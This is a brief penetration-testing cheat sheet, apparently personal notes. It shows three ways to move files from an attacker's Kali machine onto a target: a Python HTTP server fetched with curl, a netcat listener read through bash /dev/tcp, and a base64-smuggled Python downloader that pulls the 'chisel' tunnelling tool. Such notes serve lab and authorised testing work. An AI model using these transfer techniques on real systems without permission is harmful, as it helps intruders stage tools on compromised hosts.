
### [CASE 1]
```bash title="Attacker Kali"
python3 http.server 80
```

```bash title="Target"
curl <Attacker Kali IP>:80/filename
```


### [CASE 2]
```bash title="Attacker Kali"
nc -lvnp 80 < filename
```

```bash title="Target"
bash -c "cat < /dev/tcp/[Attacker Kali IP]/[PORT] > /tmp/filename"
```



### [CASE 3]
```python title="test.py"
import urllib.request

server_ip = '172.16.1.10'
server_port = 9090
file_to_download = 'chisel'

output_file = file_to_download

url = f'http://{server_ip}:{server_port}/{file_to_download}'

print(f"Download: {url}")
try:
    with urllib.request.urlopen(url) as response, open(output_file, 'wb') as out_file:
        out_file.write(response.read())
        print(f"Downloaded {url} to {output_file} Save")
        

except Exception as e:
    print(f"Failed to download: {e}")
```

```bash title="Kali"
cat test.py | base64 > d
```

```bash title="Target"
echo "d 파일 내용" | base64 -d > test.py

python3 test.py
```


